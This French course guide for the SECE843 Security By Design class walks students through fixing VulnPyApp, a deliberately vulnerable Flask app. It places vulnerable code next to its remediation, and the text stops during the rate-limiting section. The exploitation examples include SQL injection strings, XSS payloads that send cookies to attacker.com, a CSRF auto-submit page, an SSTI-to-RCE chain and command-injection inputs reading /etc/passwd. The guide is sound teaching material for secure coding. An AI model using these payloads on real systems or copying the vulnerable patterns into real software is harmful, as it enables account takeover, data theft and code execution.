# VulnPyApp — Guide de correction
## SECE843 - Security By Design

---

# PARTIE 1 — GUIDE DE CORRECTION PAS-À-PAS

---

## 📖 Comment utiliser ce guide

```
⚠️  RÉSERVÉ AUX ÉTUDIANTS après avoir tenté l'exercice.
    Consultez ce guide uniquement si vous êtes bloqué
    depuis plus de 20 minutes sur une vulnérabilité.

Approche recommandée :
  1. Lire la description de la vulnérabilité
  2. Localiser le code vulnérable VOUS-MÊME
  3. Consulter l'indice niveau 1
  4. Si toujours bloqué → indice niveau 2
  5. En dernier recours → solution complète
```

---

## 🔴 CORRECTION #1 — SQL Injection (Login)

### Localisation
```
Fichier : vulnpyapp/app.py
Fonction : login()
Ligne : ~38
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Concaténation directe dans la requête SQL + hash MD5
email = request.form.get('email', '')
password = request.form.get('password', '')

password_hash = hashlib.md5(password.encode()).hexdigest()
query = f"SELECT * FROM users WHERE email = '{email}' AND password_hash = '{password_hash}'"

result = db.session.execute(text(query)).fetchone()
```

### Pourquoi c'est dangereux
```
Saisie attaquant dans le champ email :
  ' OR '1'='1' --

Requête résultante :
  SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password_hash = '...'

La condition '1'='1' est toujours vraie.
Le commentaire -- neutralise le reste.
→ Connexion sans mot de passe valide.
```

### 💡 Indice niveau 1
```
Python DB-API 2.0 propose un mécanisme natif pour séparer
la requête de ses paramètres. Cherchez la syntaxe avec :param.
```

### 💡 Indice niveau 2
```
SQLAlchemy ORM dispose d'une méthode filter_by() qui
paramétrise automatiquement. Utilisez User.query.filter_by()
plutôt que db.session.execute() avec du SQL brut.
```

### ✅ Solution complète (vulnpyapp_remediated/app.py)
```python
# ✅ CORRIGÉ - Méthode 1 : ORM SQLAlchemy + schéma de validation
from schemas import LoginSchema
from marshmallow import ValidationError

try:
    data = LoginSchema().load(request.form.to_dict())
except ValidationError:
    return render_template('login.html', error='Invalid input'), 400

# L'ORM construit une requête paramétrée automatiquement
user = User.query.filter_by(email=data['email']).first()

if user and user.check_password(data['password']):
    login_user(user, remember=False)
    return redirect(url_for('profile'))

return render_template('login.html', error='Invalid credentials'), 401
```

```python
# ✅ CORRIGÉ - Méthode 2 : Requête paramétrée explicite (text + bind params)
from sqlalchemy import text

query = text("SELECT * FROM users WHERE email = :email")
result = db.session.execute(query, {'email': email}).fetchone()
```

### Vérification
```python
# Test manuel dans le champ email :
# ' OR '1'='1' --      → doit retourner 401
# alice@vulnpyapp.local → doit fonctionner normalement

# Test automatisé :
pytest tests/test_security.py::TestSQLInjection::test_sqli_login_bypass_blocked -v
```

### Référence
```
CWE-89 : Improper Neutralization of Special Elements used in an SQL Command
OWASP Top 10 2021 : A03 - Injection
CVSS v3.1 : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → Score 9.8 (Critical)
```

---

## 🔴 CORRECTION #2 — SQL Injection (Recherche)

### Localisation
```
Fichier : vulnpyapp/app.py
Fonction : search()
Ligne : ~91
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
query_param = request.args.get('q', '')
sql = f"SELECT * FROM products WHERE name LIKE '%{query_param}%'"
results = db.session.execute(text(sql)).fetchall()
```

### Exploitation (UNION-based)
```sql
-- Payload dans ?q=
' UNION SELECT id,email,password_hash,4,5 FROM users--

-- Requête générée :
SELECT * FROM products WHERE name LIKE '%' UNION SELECT
id,email,password_hash,4,5 FROM users--%'

-- Résultat : dump de la table users dans les résultats de recherche
```

### ✅ Solution complète (vulnpyapp_remediated/app.py)
```python
# ✅ CORRIGÉ
query_param = (request.args.get('q', '') or '').strip()[:100]  # Limitation longueur
results = []

if query_param:
    # ilike = LIKE insensible à la casse, paramétré automatiquement
    results = Product.query.filter(
        Product.name.ilike(f"%{query_param}%")
    ).limit(50).all()

return render_template('search.html', query=query_param, results=results)
```

### Vérification
```bash
pytest tests/test_security.py::TestSQLInjection -v
```

---

## 🟠 CORRECTION #3 — XSS Réfléchi

### Localisation
```
Fichier : vulnpyapp/templates/search.html
Ligne : ~11
```

### Code vulnérable
```html
<!-- ❌ VULNÉRABLE - |safe désactive l'échappement Jinja2 -->
<p>Results for: {{ query|safe }}</p>
```

### Exploitation
```
URL : /search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

La balise script est injectée telle quelle dans la page.
→ Vol de session, redirection, défacement.
```

### 💡 Indice niveau 1
```
Jinja2 échappe automatiquement les variables.
Cherchez ce qui désactive cette protection.
```

### ✅ Solution complète (vulnpyapp_remediated/templates/search.html)
```html
<!-- ✅ CORRIGÉ - Supprimer |safe suffit -->
<p>Results for: {{ query }}</p>

<!--
  Jinja2 convertit automatiquement :
  <script> → &lt;script&gt;
  " → &#34;
  ' → &#39;
-->
```

```python
# ✅ Dans app.py, s'assurer que autoescape est activé
from flask import Flask
app = Flask(__name__)
# autoescape=True est le défaut pour .html - vérifier qu'il n'est pas désactivé

# ❌ Ne jamais faire :
from jinja2 import Environment
env = Environment(autoescape=False)  # désactive la protection globalement
```

### Vérification
```bash
# Test manuel : /search?q=<script>alert(1)</script>
# → doit afficher &lt;script&gt;alert(1)&lt;/script&gt; en source
# → aucune popup ne doit apparaître

pytest tests/test_security.py::TestXSS::test_xss_reflected_escaped -v
```

---

## 🟠 CORRECTION #4 — XSS Stocké

### Localisation
```
Fichier : vulnpyapp/app.py → route /comments (POST), ligne ~112
Fichier : vulnpyapp/templates/comments.html → ligne ~20
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Stockage sans sanitization
content = request.form.get('content', '')
comment = Comment(user_id=current_user.id, content=content)
db.session.add(comment)
```

```html
<!-- ❌ VULNÉRABLE - Affichage avec |safe -->
<p>{{ c.content|safe }}</p>
```

### Exploitation
```html
<!-- Payload posté dans le formulaire de commentaire -->
<img src="x" onerror="
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
">

<!-- Exécuté pour CHAQUE visiteur qui consulte la page -->
```

### ✅ Solution complète

**Étape 1 : Sanitizer à l'entrée (Bleach) — vulnpyapp_remediated/security.py**
```python
# ✅ Dans security.py - helper réutilisable
import bleach

ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li']
ALLOWED_ATTRS = {'a': ['href', 'title']}
ALLOWED_PROTOCOLS = ['http', 'https', 'mailto']

def sanitize_html(content: str) -> str:
    """Nettoie le HTML utilisateur avec une allowlist stricte"""
    if not content:
        return ''
    return bleach.clean(
        content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        protocols=ALLOWED_PROTOCOLS,
        strip=True  # Supprime les tags non autorisés
    )
```

```python
# ✅ Dans app.py - route /comments POST
from security import sanitize_html
from schemas import CommentSchema

@app.route('/comments', methods=['GET', 'POST'])
def comments():
    if request.method == 'POST':
        if not current_user.is_authenticated:
            return redirect(url_for('login'))

        try:
            data = CommentSchema().load(request.form.to_dict())
        except ValidationError:
            flash('Invalid comment', 'error')
            return redirect(url_for('comments'))

        clean_content = sanitize_html(data['content'])

        comment = Comment(user_id=current_user.id, content=clean_content)
        db.session.add(comment)
        db.session.commit()
        return redirect(url_for('comments'))
```

**Étape 2 : Affichage sécurisé**
```html
<!-- ✅ |safe acceptable UNIQUEMENT car Bleach a déjà nettoyé -->
<!-- Les seuls tags présents sont dans la liste blanche -->
<div>{{ c.content|safe }}</div>

<!-- Alternative plus stricte : supprimer aussi |safe -->
<!-- Dans ce cas, les balises <b> etc. s'affichent en texte brut -->
<div>{{ c.content }}</div>
```

### Règle mnémotechnique
```
Entrée  → Valider + Sanitizer (Bleach)
Sortie  → Encoder (Jinja2 auto ou |e explicite)
|safe   → UNIQUEMENT si vous contrôlez à 100% la source de la donnée
```

### Vérification
```bash
pytest tests/test_security.py::TestXSS::test_xss_stored_bleach_sanitized -v
pytest tests/test_security.py::TestXSS::test_xss_allowed_tags_preserved -v
```

---

## 🟠 CORRECTION #5 — XSS DOM-based

### Localisation
```
Fichier : vulnpyapp/templates/profile.html
Lignes : ~20-21 (script utilisant location.hash + innerHTML)
```

### Code vulnérable
```html
<!-- ❌ VULNÉRABLE - injection via fragment d'URL -->
<div id="welcome"></div>
<script>
  // location.hash retourne la valeur après le # sans encodage
  const name = decodeURIComponent(location.hash.substring(1)) || "{{ user.username }}";
  document.getElementById('welcome').innerHTML = "Hello, " + name + "!";  // ← dangereux !
</script>

<!--
  URL malveillante :
  /profile#<img src=x onerror=alert(document.cookie)>
  Aucune requête serveur → pas détectable dans les logs
-->
```

### ✅ Solution complète (vulnpyapp_remediated/templates/profile.html)
```html
<!-- ✅ CORRIGÉ -->
<div id="welcome"></div>
<script nonce="{{ csp_nonce() }}">
  // ✅ textContent au lieu de innerHTML
  // textContent traite la valeur comme du texte pur, jamais comme du HTML
  const username = {{ current_user.username|tojson }};
  document.getElementById('welcome').textContent = "Hello, " + username + "!";

  // ✅ tojson encode la chaîne pour une insertion sûre dans JS
  // Pas de location.hash - la valeur vient du serveur (authentifié)
  // ✅ nonce CSP fourni par Flask-Talisman (extensions.py)
</script>
```

### Tableau des méthodes DOM : dangereuses vs sûres
```
❌ DANGEREUX        ✅ SÛR
─────────────────────────────────────────────────
innerHTML =         textContent =
outerHTML =         innerText =
document.write()    setAttribute() [selon attr]
insertAdjacentHTML  createElement()
eval()              createTextNode()
setTimeout(string)  addEventListener()
```

---

## 🔴 CORRECTION #6 — CSRF

### Localisation
```
Fichier : vulnpyapp/app.py → toutes les routes POST (update_profile ligne ~139)
Fichier : vulnpyapp/templates/*.html → formulaires
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Pas de vérification de l'origine de la requête
@app.route('/profile/update', methods=['POST'])
@login_required
def update_profile():
    current_user.bio = request.form.get('bio', '')
    current_user.username = request.form.get('username', current_user.username)
    db.session.commit()
    # N'importe quel site peut soumettre ce formulaire à la place de l'utilisateur
```

### Exploitation
```html
<!-- Site attaquant : evil.com -->
<!-- Visiteur connecté sur vulnpyapp → formulaire soumis automatiquement -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost:5000/profile/update" method="POST">
    <input type="hidden" name="username" value="hacked_by_attacker">
  </form>
</body>
</html>
```

### ✅ Solution complète

**Étape 1 : Initialiser Flask-WTF (vulnpyapp_remediated/extensions.py)**
```python
# ✅ extensions.py
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()

# ✅ app.py (factory create_app)
from extensions import csrf

def create_app(config_name='default'):
    app = Flask(__name__)
    app.config.from_object(config[config_name])
    csrf.init_app(app)  # Protection CSRF globale sur tous les POST
    return app
```

**Étape 2 : Ajouter le token dans chaque formulaire**
```html
<!-- ✅ Dans chaque <form method="POST"> -->
<form method="POST" action="/profile/update">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- autres champs... -->
    <button type="submit">Update</button>
</form>
```

**Étape 3 : Exclure les API JSON si nécessaire**
```python
# ✅ Pour les endpoints API consommant du JSON (avec JWT)
from flask_wtf.csrf import csrf_exempt

@app.route('/api/data', methods=['POST'])
@csrf_exempt  # Acceptable si authentification par token Bearer
def api_endpoint():
    ...
```

### Comment fonctionne le token CSRF
```
1. Serveur génère un token unique par session → stocké en session
2. Token inclus dans le formulaire HTML
3. Formulaire soumis → token renvoyé dans le POST
4. Serveur compare token reçu ↔ token en session
5. Mismatch → 400 Bad Request

Un site attaquant ne peut pas lire le token (Same-Origin Policy)
→ ne peut pas forger une requête valide
```

### Vérification
```bash
# Vérifier la présence du token dans les formulaires
curl -s http://localhost:5000/login | grep csrf_token

pytest tests/test_security.py::TestCSRF -v
```

---

## 🟠 CORRECTION #7 — IDOR (Insecure Direct Object Reference)

### Localisation
```
Fichier : vulnpyapp/app.py
Fonction : get_order() ligne ~152, get_user() ligne ~162
Routes : /api/orders/<int:order_id> , /api/users/<int:user_id>
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Récupération par ID sans vérification du propriétaire
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.get(order_id)
    if not order:
        return jsonify({'error': 'Not found'}), 404
    return jsonify(order.to_dict())  # N'importe quel utilisateur connecté
                                      # peut accéder à n'importe quelle commande
```

### Exploitation
```python
# Alice (user_id=2) est connectée
# Bob (user_id=3) a la commande id=42

import requests
session = requests.Session()
session.post('/login', data={'email': 'alice@...', 'password': 'Alice123!'})

# Alice accède à la commande de Bob → 200 OK ❌
response = session.get('/api/orders/42')
print(response.json())  # Données de Bob exposées
```

### ✅ Solution complète (vulnpyapp_remediated/app.py)
```python
# ✅ CORRIGÉ - Filtrage par propriétaire
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    # ✅ Filtre direct par user_id : aucune fuite possible
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id
    ).first()

    # Les admins peuvent voir toutes les commandes
    if not order and current_user.is_admin:
        order = Order.query.get(order_id)

    if not order:
        abort(404)  # 404 plutôt que 403 : ne pas confirmer l'existence

    return jsonify(order.to_dict())


# ✅ Endpoint dédié pour les propres commandes de l'utilisateur
@app.route('/api/my/orders')
@login_required
def my_orders():
    """Pas d'ID exposé : préféré pour les usages courants"""
    orders = Order.query.filter_by(user_id=current_user.id).all()
    return jsonify([o.to_dict() for o in orders])
```

### Même vulnérabilité sur `/api/users/<id>`

```
Fichier : vulnpyapp/app.py, fonction get_user(), ligne ~162
Route : /api/users/<int:user_id>
```

```python
# ❌ MÊME DÉFAUT : pas de vérification de propriétaire
user = User.query.get(user_id)
if not user:
    return jsonify({'error': 'Not found'}), 404
return jsonify(user.to_dict())
# Tout utilisateur connecté peut voir email + is_admin de n'importe qui
```

```python
# ✅ CORRIGÉ - Filtrer les champs exposés selon le propriétaire
@app.route('/api/users/<int:user_id>')
@login_required
def get_user(user_id):
    user = User.query.get_or_404(user_id)

    # Seul le propriétaire ou un admin voit email + is_admin
    if current_user.id != user.id and not current_user.is_admin:
        # ✅ Données publiques uniquement (id, username, bio)
        return jsonify(user.to_safe_dict())

    return jsonify({
        **user.to_safe_dict(),
        'email': user.email,
        'is_admin': user.is_admin
    })
```

### Principe général
```python
# ✅ Pattern à appliquer systématiquement pour toute ressource
def get_resource(resource_id):
    if current_user.is_admin:
        resource = Resource.query.get_or_404(resource_id)
    else:
        resource = Resource.query.filter_by(
            id=resource_id,
            owner_id=current_user.id  # ← clé de l'IDOR fix
        ).first_or_404()
    return resource
```

### Vérification
```bash
pytest tests/test_security.py::TestIDOR -v
```

---

## 🟠 CORRECTION #8 — Mass Assignment

### Localisation
```
Fichier : vulnpyapp/app.py
Fonction : register()
Ligne : ~70
Route : /register (POST)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Assignation directe des données du formulaire au modèle
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        data = request.form.to_dict()
        user = User(**{k: v for k, v in data.items() if k != 'password'})
        user.set_password(data.get('password', ''))
        db.session.add(user)
        db.session.commit()

# Payload attaquant :
# email=hack@x.com&username=hacker&password=Hack123!&is_admin=true
# → Compte admin créé directement !
```

### ✅ Solution complète

**Méthode 1 : Allowlist manuelle (simple)**
```python
# ✅ CORRIGÉ - Allowlist explicite des champs autorisés
@app.route('/register', methods=['POST'])
def register():
    # ✅ Uniquement les champs que l'utilisateur est autorisé à définir
    email    = request.form.get('email', '').strip().lower()
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    bio      = request.form.get('bio', '').strip()

    # ✅ is_admin n'est JAMAIS lu depuis le formulaire
    # Valeur par défaut False définie dans le modèle

    user = User(
        email=email,
        username=username,
        bio=bio,
        is_admin=False  # Valeur fixe, jamais depuis request.form
    )
    user.set_password(password)
    db.session.add(user)
    db.session.commit()
```

**Méthode 2 : Schéma Marshmallow (robuste) — vulnpyapp_remediated/schemas.py**
```python
# ✅ schemas.py
from marshmallow import Schema, fields, validate, EXCLUDE

class RegisterSchema(Schema):
    """Allowlist stricte : is_admin n'est PAS exposé"""
    class Meta:
        unknown = EXCLUDE  # ✅ Ignore tout champ non déclaré

    email = fields.Email(required=True, validate=validate.Length(max=120))
    username = fields.String(
        required=True,
        validate=[
            validate.Length(min=3, max=80),
            validate.Regexp(r'^[a-zA-Z0-9_-]+$',
                            error="Username: alphanumeric, _ or - only")
        ]
    )
    password = fields.String(
        required=True,
        validate=[
            validate.Length(min=8, max=128),
            validate.Regexp(
                r'^(?=.*[A-Z])(?=.*[a-z])(?=.*\d).+$',
                error="Password must contain uppercase, lowercase and digit"
            )
        ],
        load_only=True
    )
    bio = fields.String(load_default='', validate=validate.Length(max=500))

    # ✅ is_admin n'apparaît pas → automatiquement ignoré à la désérialisation


class ProfileUpdateSchema(Schema):
    """Mise à jour de profil : seuls username et bio modifiables"""
    class Meta:
        unknown = EXCLUDE

    username = fields.String(validate=[
        validate.Length(min=3, max=80),
        validate.Regexp(r'^[a-zA-Z0-9_-]+$')
    ])
    bio = fields.String(validate=validate.Length(max=500))
    # email et is_admin absents → ignorés même s'ils sont envoyés
```

```python
# ✅ Dans vulnpyapp_remediated/app.py
from schemas import RegisterSchema
from marshmallow import ValidationError
from security import sanitize_html

@app.route('/register', methods=['GET', 'POST'])
@limiter.limit("3 per minute", methods=['POST'])
def register():
    if request.method == 'POST':
        try:
            data = RegisterSchema().load(request.form.to_dict())
        except ValidationError as err:
            return render_template('register.html', errors=err.messages), 400

        if User.query.filter_by(email=data['email']).first():
            return render_template(
                'register.html',
                errors={'email': ['Already registered']}
            ), 409

        # ✅ Construction explicite : is_admin JAMAIS modifiable
        user = User(
            email=data['email'],
            username=data['username'],
            bio=sanitize_html(data.get('bio', '')),
            is_admin=False  # toujours False à l'inscription
        )
        user.set_password(data['password'])

        db.session.add(user)
        db.session.commit()

        login_user(user)
        return redirect(url_for('profile'))

    return render_template('register.html')
```

### Vérification
```bash
pytest tests/test_security.py::TestMassAssignment -v
```

---

## 🔴 CORRECTION #9 — SSTI (Server-Side Template Injection)

### Localisation
```
Fichier : vulnpyapp/app.py
Fonction : hello()
Ligne : ~175
Route : /hello
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Rendu de template dynamique depuis l'entrée utilisateur
from jinja2 import Template

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # Template construit avec la valeur utilisateur → exécuté par Jinja2
    template_str = f"<h1>Hello {name}!</h1>"
    template = Template(template_str)
    return template.render()
```

### Exploitation (escalade vers RCE)
```
Étape 1 - Détection :
  /hello?name={{ 7*7 }}
  → Affiche "Hello 49!"  (l'expression est évaluée)

Étape 2 - Accès à la configuration :
  /hello?name={{ config.SECRET_KEY }}
  → Affiche la clé secrète Flask

Étape 3 - RCE via MRO Python :
  /hello?name={{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}
  → Exécute la commande système 'id'
  → Résultat : uid=0(root)...
```

### ✅ Solution complète (vulnpyapp_remediated/app.py)
```python
# ✅ CORRIGÉ - Méthode 1 : render_template avec variable (recommandé)
@app.route('/hello')
def hello():
    name = (request.args.get('name', 'World') or 'World')[:50]
    # ✅ La variable est passée comme paramètre, jamais concaténée dans le template
    # Jinja2 échappe automatiquement {{ name }} → ni SSTI ni XSS
    return render_template('hello.html', name=name)
```

```python
# ✅ CORRIGÉ - Méthode 2 : render_template_string avec variable séparée
from flask import render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    name = name[:50]  # Limitation de longueur

    # ✅ La variable utilisateur n'est PAS dans la chaîne de template
    # Elle est passée comme contexte → Jinja2 l'échappe
    template = "Hello {{ name }}!"
    return render_template_string(template, name=name)
    # name={{ 7*7 }} → affiche "Hello {{ 7*7 }}!" (littéral, non évalué)
```

### Règle fondamentale
```
❌ JAMAIS : Template(f"... {user_input} ...")
❌ JAMAIS : render_template_string(f"... {user_input} ...")

✅ TOUJOURS : render_template('file.html', variable=user_input)
✅ TOUJOURS : render_template_string("... {{ variable }} ...", variable=user_input)
```

### Vérification
```bash
pytest tests/test_security.py::TestSSTI -v
```

---

## 🟠 CORRECTION #10 — Path Traversal

### Localisation
```
Fichier : vulnpyapp/app.py
Fonction : download()
Ligne : ~187
Route : /download
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
@app.route('/download')
def download():
    filename = request.args.get('file', '')
    filepath = os.path.join('uploads', filename)
    try:
        return send_file(filepath, as_attachment=True)
    except Exception as e:
        return f"Error: {str(e)}", 404

# /download?file=../../etc/passwd → fonctionne !
# /download?file=../app.py        → code source exposé !
```

### ✅ Solution complète (vulnpyapp_remediated/)

**security.py — helper `safe_path()`**
```python
import os

def safe_path(base_dir: str, user_path: str) -> str | None:
    """Protection path traversal : retourne None si traversée détectée"""
    if not user_path:
        return None
    # Refuser tout caractère suspect d'emblée
    if '..' in user_path or user_path.startswith('/') or user_path.startswith('\\'):
        return None

    base_real = os.path.realpath(base_dir)
    target = os.path.realpath(os.path.join(base_real, user_path))

    # Vérifier que la cible reste dans base_dir
    if os.path.commonpath([base_real, target]) != base_real:
        return None
    return target
```

**app.py — route /download**
```python
# ✅ CORRIGÉ
import os
from flask import send_from_directory, abort
from werkzeug.utils import secure_filename
from security import safe_path

@app.route('/download')
@login_required
def download():
    filename = request.args.get('file', '')

    # ✅ Étape 1 : secure_filename() supprime ../ et caractères dangereux
    safe_name = secure_filename(filename)
    if not safe_name:
        abort(400)

    # ✅ Étape 2 : Vérification de l'extension (liste blanche depuis config)
    if not any(safe_name.lower().endswith(f'.{ext}')
               for ext in app.config['ALLOWED_EXTENSIONS']):
        abort(400)

    # ✅ Étape 3 : Vérification que le chemin reste dans uploads/
    target = safe_path(app.config['UPLOAD_FOLDER'], safe_name)
    if not target or not os.path.isfile(target):
        abort(404)  # 404 plutôt que 403 : ne pas confirmer l'existence

    # ✅ Étape 4 : send_from_directory protège contre le traversal
    return send_from_directory(
        app.config['UPLOAD_FOLDER'],
        safe_name,
        as_attachment=True
    )
```

### Visualisation de la protection
```
Input : ../../etc/passwd
  secure_filename() → etcpasswd  (supprime ../ et /)
  realpath()        → /app/uploads/etcpasswd
  startswith check  → /app/uploads/etcpasswd starts with /app/uploads/ ✅
  isfile()          → False → 404

Input : ../app.py
  secure_filename() → app.py
  realpath()        → /app/uploads/app.py
  startswith check  → ✅
  isfile()          → False → 404 (app.py n'est pas dans uploads/)
```

### Vérification
```bash
pytest tests/test_security.py::TestPathTraversal -v
```

---

## 🔴 CORRECTION #11 — Injection de commandes

### Localisation
```
Fichier : vulnpyapp/app.py
Fonction : ping()
Ligne : ~201
Route : /ping (GET, POST)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - shell=True avec entrée utilisateur
import subprocess

@app.route('/ping', methods=['GET', 'POST'])
def ping():
    result = None
    if request.method == 'POST':
        host = request.form.get('host', '')
        try:
            result = subprocess.check_output(
                f"ping -c 1 {host}",
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=5
            ).decode()
        except Exception as e:
            result = f"Error: {str(e)}"
    return render_template('ping.html', result=result)

# Payload : localhost; cat /etc/passwd
# Commande exécutée : ping -c 1 localhost; cat /etc/passwd
```

### ✅ Solution complète (vulnpyapp_remediated/)

**security.py — helper `is_safe_host()`**
```python
import re
import ipaddress

HOSTNAME_RE = re.compile(
    r'^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?'
    r'(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$'
)

def is_safe_host(host: str) -> bool:
    """Valide qu'il s'agit d'un hostname ou d'une IP publique (anti-SSRF)"""
    if not host or len(host) > 253:
        return False
    # Tenter IP
    try:
        ip = ipaddress.ip_address(host)
        # Refuser IPs privées / loopback / link-local / multicast
        return not (ip.is_private or ip.is_loopback
                    or ip.is_link_local or ip.is_multicast)
    except ValueError:
        pass
    # Sinon hostname
    return bool(HOSTNAME_RE.match(host))
```

**app.py — route /ping**
```python
# ✅ CORRIGÉ
import subprocess
from schemas import PingSchema
from security import is_safe_host

@app.route('/ping', methods=['GET', 'POST'])
@login_required
@limiter.limit("10 per minute", methods=['POST'])
def ping():
    if request.method == 'POST':
        try:
            data = PingSchema().load(request.form.to_dict())
        except ValidationError:
            return render_template('ping.html', error='Invalid host'), 400

        host = data['host']

        # ✅ Double validation : schéma + anti-SSRF
        if not is_safe_host(host):
            return render_template('ping.html', error='Host not allowed'), 400

        try:
            # ✅ Liste de commandes, pas une chaîne → shell=False
            # subprocess ne passe PAS par /bin/sh
            # L'injection de commandes via ; | & est impossible
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '2', host],  # ← liste, pas f-string
                capture_output=True,
                text=True,
                timeout=5,
                shell=False,  # ✅ Valeur par défaut, explicite pour clarté
                check=False
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            output = "Timeout"
        except Exception:
            output = "Error executing ping"

        return render_template('ping.html', result=output, host=host)

    return render_template('ping.html')
```

### Pourquoi `shell=False` protège
```
shell=True  → /bin/sh -c "ping -c 1 localhost; cat /etc/passwd"
              Le shell interprète ; comme séparateur de commandes ❌

shell=False → execve('ping', ['-c', '1', 'localhost; cat /etc/passwd'])
              L'argument est passé tel quel à ping, qui ne trouve pas l'hôte ✅
```

### Vérification
```bash
pytest tests/test_security.py::TestCommandInjection -v
```

---

## 🟡 CORRECTION #12 — Hashage faible (MD5)

### Localisation
```
Fichier : vulnpyapp/models.py
Méthode : set_password(), check_password() (lignes ~23-28)
```

### Code vulnérable
```python
# ❌ VULNÉRABLE
import hashlib

class User(UserMixin, db.Model):
    password_hash = db.Column(db.String(32), nullable=False)  # MD5 = 32 hex

    def set_password(self, password):
        # MD5 sans sel : cassable en secondes avec des tables arc-en-ciel
        self.password_hash = hashlib.md5(password.encode()).hexdigest()

    def check_password(self, password):
        return self.password_hash == hashlib.md5(password.encode()).hexdigest()
```

### ✅ Solution complète (vulnpyapp_remediated/models.py)
```python
# ✅ CORRIGÉ - bcrypt natif (pas Flask-Bcrypt)
import bcrypt
from flask_login import UserMixin
from extensions import db

class User(UserMixin, db.Model):
    # ✅ bcrypt produit ~60 caractères
    password_hash = db.Column(db.String(60), nullable=False)

    def set_password(self, password: str) -> None:
        """Hashage bcrypt avec cost factor 12"""
        if not password or len(password) < 8:
            raise ValueError("Password must be at least 8 characters")
        # ✅ bcrypt intègre un sel aléatoire automatiquement
        # ✅ cost factor 12 = ~250ms de calcul → résistant au brute-force
        salt = bcrypt.gensalt(rounds=12)
        self.password_hash = bcrypt.hashpw(
            password.encode('utf-8'), salt
        ).decode('utf-8')

    def check_password(self, password: str) -> bool:
        """Vérification constante en temps (bcrypt natif)"""
        if not password or not self.password_hash:
            return False
        try:
            # ✅ Comparaison en temps constant → pas de timing attack
            return bcrypt.checkpw(
                password.encode('utf-8'),
                self.password_hash.encode('utf-8')
            )
        except (ValueError, TypeError):
            return False
```

### Comparaison des algorithmes
```
Algorithme  | Résistance brute-force | Recommandé
────────────┼────────────────────────┼───────────
MD5         | ❌ Très faible (GPU)   | Non
SHA-1       | ❌ Faible              | Non
SHA-256     | ❌ Faible (pas de sel) | Non
SHA-256+sel | ⚠️  Moyen              | Non (PBKDF2 minimum)
PBKDF2      | ✅ Correct             | Acceptable
bcrypt      | ✅ Fort                | ✅ Recommandé
Argon2id    | ✅✅ Très fort          | ✅ Recommandé (OWASP 2023)
scrypt      | ✅✅ Très fort          | ✅ Recommandé
```

### Vérification
```bash
pytest tests/test_security.py::TestPasswordHashing -v
```

---

## 🟡 CORRECTION #13 — Cookies non sécurisés

### Localisation
```
Fichier : vulnpyapp/config.py
Fichier : vulnpyapp/app.py → création de l'application
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - vulnpyapp/config.py
class Config:
    # 🚨 Clé secrète faible et hardcodée
    SECRET_KEY = os.getenv('SECRET_KEY', 'insecure-dev-key')

    # 🚨 Cookies sans flags de sécurité
    SESSION_COOKIE_SECURE = False
    SESSION_COOKIE_HTTPONLY = False
    SESSION_COOKIE_SAMESITE = None
```

### ✅ Solution complète (vulnpyapp_remediated/config.py)
```python
import os
import secrets

class Config:
    """Configuration de base sécurisée"""

    # ✅ Clé secrète forte générée aléatoirement si non fournie
    SECRET_KEY = os.environ.get('SECRET_KEY') or secrets.token_hex(32)

    # ✅ Cookie uniquement via HTTPS
    SESSION_COOKIE_SECURE = True
    # ✅ Cookie inaccessible depuis JavaScript → bloque vol via XSS
    SESSION_COOKIE_HTTPONLY = True
    # ✅ Cookie non envoyé dans les requêtes cross-origin → bloque CSRF
    SESSION_COOKIE_SAMESITE = 'Strict'
    # ✅ Durée de vie de session (30 minutes d'inactivité)
    PERMANENT_SESSION_LIFETIME = 1800
    # ✅ Préfixe __Host- : impose Secure + Path=/ + pas de Domain
    SESSION_COOKIE_NAME = '__Host-session'

    # ✅ CSRF
    WTF_CSRF_ENABLED = True
    WTF_CSRF_TIME_LIMIT = 3600


class ProductionConfig(Config):
    DEBUG = False

    def __init__(self):
        # ✅ SECRET_KEY obligatoire en prod
        if not os.environ.get('SECRET_KEY'):
            raise RuntimeError("SECRET_KEY must be set in production")


class DevelopmentConfig(Config):
    DEBUG = True
    # ✅ En dev local sans HTTPS, on relâche Secure (à documenter)
    SESSION_COOKIE_SECURE = False
    SESSION_COOKIE_NAME = 'session'  # __Host- exige Secure
```

### Impact des flags
```
Flag        | Protection contre
────────────┼──────────────────────────────────────
Secure      | Interception réseau (HTTP non chiffré)
HttpOnly    | Vol de cookie via XSS (document.cookie)
SameSite    | CSRF (requêtes cross-site)
```

---

## 🟡 CORRECTION #14 — Absence de Rate Limiting

### Localisation
```
Fichier : vulnpyapp/app.py
Route : /login (POST), ligne ~38
```

### Code vulnérable
```python
# ❌ VULNÉRABLE - Aucune limitation de tentatives
